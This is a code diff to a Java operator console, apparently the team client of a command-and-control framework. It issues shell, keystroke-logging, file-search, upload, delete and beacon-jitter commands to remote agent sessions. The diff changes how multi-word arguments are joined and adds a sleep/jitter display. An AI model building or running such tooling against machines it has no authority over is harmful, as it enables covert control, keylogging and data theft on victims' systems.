@@ -65,7 +65,7 @@ public final class TeamClient {
                 if (Input == null) break;
                 Input = Input.trim();
                 if (Input.isEmpty()) continue;
-                String[] Parts = Input.split("\\s+", 3);
+                String[] Parts = Input.split("\\s+");
                 String Cmd = Parts[0].toLowerCase();
                 Dispatch(Cmd, Parts, Input);
             } catch (IOException Ex) {
@@ -185,7 +185,7 @@ public final class TeamClient {
                     break;
                 }
                 try {
-                    Exec(ParseInt(P[1]), P.length > 2 ? "ls " + P[2] : "ls");
+                    Exec(ParseInt(P[1]), P.length > 2 ? "ls " + Args(P, 2) : "ls");
                 } catch (NumberFormatException Ex) {
                     Logger.Warn("invalid session ID");
                 }
@@ -196,7 +196,7 @@ public final class TeamClient {
                     break;
                 }
                 try {
-                    Exec(ParseInt(P[1]), "cat " + P[2]);
+                    Exec(ParseInt(P[1]), "cat " + Args(P, 2));
                 } catch (NumberFormatException Ex) {
                     Logger.Warn("invalid session ID");
                 }
@@ -218,7 +218,7 @@ public final class TeamClient {
                     break;
                 }
                 try {
-                    String[] Up = P[2].split("\\s+", 2);
+                    String[] Up = Args(P, 2).split("\\s+", 2);
                     DoUpload(ParseInt(P[1]), Up[0], Up.length > 1 ? Up[1] : "");
                 } catch (NumberFormatException Ex) {
                     Logger.Warn("invalid session ID");
@@ -230,7 +230,7 @@ public final class TeamClient {
                     break;
                 }
                 try {
-                    SetNote(ParseInt(P[1]), P[2]);
+                    SetNote(ParseInt(P[1]), Args(P, 2));
                 } catch (NumberFormatException Ex) {
                     Logger.Warn("invalid session ID");
                 }
@@ -280,7 +280,7 @@ public final class TeamClient {
                     break;
                 }
                 try {
-                    Exec(ParseInt(P[1]), "shell " + P[2]);
+                    Exec(ParseInt(P[1]), "shell " + Args(P, 2));
                 } catch (NumberFormatException Ex) {
                     Logger.Warn("invalid session ID");
                 }
@@ -327,63 +327,63 @@ public final class TeamClient {
             case "lastlog" -> { if (P.length < 2) Logger.Warn("usage: lastlog <id>"); else SimpleExec(P, "lastlog"); }
             case "jitter" -> {
                 if (P.length < 3) { Logger.Warn("usage: jitter <id> <ms>"); break; }
-                SimpleExec(new String[]{P[0], P[1]}, "jitter " + P[2]);
+                SimpleExec(new String[]{P[0], P[1]}, "jitter " + Args(P, 2));
             }
             case "keystroke" -> {
                 if (P.length < 3) { Logger.Warn("usage: keystroke <id> <on|off>"); break; }
-                SimpleExec(new String[]{P[0], P[1]}, "keystroke " + P[2]);
+                SimpleExec(new String[]{P[0], P[1]}, "keystroke " + Args(P, 2));
             }
             case "searchfiles" -> {
                 if (P.length < 3) { Logger.Warn("usage: searchfiles <id> <pattern>"); break; }
-                SimpleExec(new String[]{P[0], P[1]}, "searchfiles " + P[2]);
+                SimpleExec(new String[]{P[0], P[1]}, "searchfiles " + Args(P, 2));
             }
             case "osquery" -> {
                 if (P.length < 3) { Logger.Warn("usage: osquery <id> <sql>"); break; }
-                SimpleExec(new String[]{P[0], P[1]}, "osquery " + P[2]);
+                SimpleExec(new String[]{P[0], P[1]}, "osquery " + Args(P, 2));
             }
             case "head" -> {
                 if (P.length < 3) { Logger.Warn("usage: head <id> <file> [n]"); break; }
-                SimpleExec(new String[]{P[0], P[1]}, "head " + P[2]);
+                SimpleExec(new String[]{P[0], P[1]}, "head " + Args(P, 2));
             }
             case "tail" -> {
                 if (P.length < 3) { Logger.Warn("usage: tail <id> <file> [n]"); break; }
-                SimpleExec(new String[]{P[0], P[1]}, "tail " + P[2]);
+                SimpleExec(new String[]{P[0], P[1]}, "tail " + Args(P, 2));
             }
             case "rm" -> {
                 if (P.length < 3) { Logger.Warn("usage: rm <id> <path>"); break; }
-                SimpleExec(new String[]{P[0], P[1]}, "rm " + P[2]);
+                SimpleExec(new String[]{P[0], P[1]}, "rm " + Args(P, 2));
             }
             case "mkdir" -> {
                 if (P.length < 3) { Logger.Warn("usage: mkdir <id> <path>"); break; }
-                SimpleExec(new String[]{P[0], P[1]}, "mkdir " + P[2]);
+                SimpleExec(new String[]{P[0], P[1]}, "mkdir " + Args(P, 2));
             }
             case "cp" -> {
                 if (P.length < 3) { Logger.Warn("usage: cp <id> <src> <dst>"); break; }
-                SimpleExec(new String[]{P[0], P[1]}, "cp " + P[2]);
+                SimpleExec(new String[]{P[0], P[1]}, "cp " + Args(P, 2));
             }
             case "mv" -> {
                 if (P.length < 3) { Logger.Warn("usage: mv <id> <src> <dst>"); break; }
-                SimpleExec(new String[]{P[0], P[1]}, "mv " + P[2]);
+                SimpleExec(new String[]{P[0], P[1]}, "mv " + Args(P, 2));
             }
             case "chmod" -> {
                 if (P.length < 3) { Logger.Warn("usage: chmod <id> <mode> <file>"); break; }
-                SimpleExec(new String[]{P[0], P[1]}, "chmod " + P[2]);
+                SimpleExec(new String[]{P[0], P[1]}, "chmod " + Args(P, 2));
             }
             case "find" -> {
                 if (P.length < 3) { Logger.Warn("usage: find <id> <path> [name]"); break; }
-                SimpleExec(new String[]{P[0], P[1]}, "find " + P[2]);
+                SimpleExec(new String[]{P[0], P[1]}, "find " + Args(P, 2));
             }
             case "grep" -> {
                 if (P.length < 3) { Logger.Warn("usage: grep <id> <pattern> <file>"); break; }
-                SimpleExec(new String[]{P[0], P[1]}, "grep " + P[2]);
+                SimpleExec(new String[]{P[0], P[1]}, "grep " + Args(P, 2));
             }
             case "hash" -> {
                 if (P.length < 3) { Logger.Warn("usage: hash <id> <file> [sha256|md5]"); break; }
-                SimpleExec(new String[]{P[0], P[1]}, "hash " + P[2]);
+                SimpleExec(new String[]{P[0], P[1]}, "hash " + Args(P, 2));
             }
             case "cd" -> {
                 if (P.length < 3) { Logger.Warn("usage: cd <id> <path>"); break; }
-                SimpleExec(new String[]{P[0], P[1]}, "cd " + P[2]);
+                SimpleExec(new String[]{P[0], P[1]}, "cd " + Args(P, 2));
             }
             case "stats" -> {
                 try {
@@ -671,6 +671,9 @@ public final class TeamClient {
             Logger.Custom(INDENT + "%sAddress   %s%s:%d%n", AnsiColor.Red, AnsiColor.White, R.getOrDefault("Host", "?"), ((Number) R.getOrDefault("Port", 0.0)).intValue());
             Logger.Custom(INDENT + "%sUptime    %s%s%n", AnsiColor.Red, AnsiColor.White, R.getOrDefault("Uptime", "?"));
             Logger.Custom(INDENT + "%sSessions  %s%d%n", AnsiColor.Red, AnsiColor.White, ((Number) R.getOrDefault("Agents", 0.0)).intValue());
+            long SleepMs  = ((Number) R.getOrDefault("SleepIntervalMs", 5000.0)).longValue();
+            long JitterMs = ((Number) R.getOrDefault("JitterMs", 1000.0)).longValue();
+            Logger.Custom(INDENT + "%sSleep     %s%ds ± %dms%n", AnsiColor.Red, AnsiColor.White, SleepMs / 1000, JitterMs);
             String DbType   = R.getOrDefault("DbType", "none").toString();
             boolean DbUp    = Boolean.parseBoolean(R.getOrDefault("DbOnline", "false").toString());
             Logger.Custom(INDENT + "%sDB        %s%s (%s)%n", AnsiColor.Red, AnsiColor.White, DbUp ? "connected" : "offline", DbType);
@@ -804,6 +807,16 @@ public final class TeamClient {
         } catch (Exception Ex) {
             Logger.Error(Ex.getMessage());
         }
+    }
+
+    private static String Args(String[] Parts, int FromIndex) {
+        if (FromIndex >= Parts.length) return "";
+        StringBuilder Builder = new StringBuilder();
+        for (int Index = FromIndex; Index < Parts.length; Index++) {
+            if (Index > FromIndex) Builder.append(' ');
+            Builder.append(Parts[Index]);
+        }
+        return Builder.toString();
     }
 
     private void Exec(int Id, String Cmd) {
